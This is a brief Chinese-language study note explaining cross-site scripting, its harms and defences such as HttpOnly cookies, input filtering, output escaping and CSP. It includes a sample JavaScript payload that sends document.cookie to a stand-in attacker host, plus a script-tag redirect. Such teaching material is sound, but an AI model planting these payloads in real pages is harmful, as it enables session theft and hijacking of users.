# XSS

XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码

XSS的攻击过程都是在浏览器通过执行javascript脚本自动进行，缺少与用户交互的过程

![img](https://segmentfault.com/img/remote/1460000012693785?w=1031&h=767)

### XSS的危害

- 窃取网页浏览中的cookie值，这里和CSRF的区别是，这里是拿到了cookie后主动冒充用户的，而CSRF中根本就不知cookie，仅利用浏览器的隐式校验方式冒充用户。

  ```
  var i=document.createElement("img");
  document.body.appendChild(i);
  i.src ="http://www.hackerserver.com/?c=" + document.cookie;
  ```

  

- 劫持流量实现恶意跳转
想办法插入一句像这样的语句：`<script>window.location.href="http://www.baidu.com";</script>`

- 构建Get和Post请求

  XSS可以在javascript中构建get或者post请求，来实现自己的攻击

### 防范手段
1. 给关键的Cookie设置HttpOnly属性
2. 输入检查

首先是过滤。对诸如<script>、<img>、<a>等标签进行过滤。

其次是编码。像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。

最后是限制。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。

3. 输出转义

一般说来，除了富文本输出之外，在变量输出到HTML页面时，可以使用编码或者转义的方式来防御XSS攻击

把恶意代码摘除；如一些敏感关键字：<script>

4. CSP


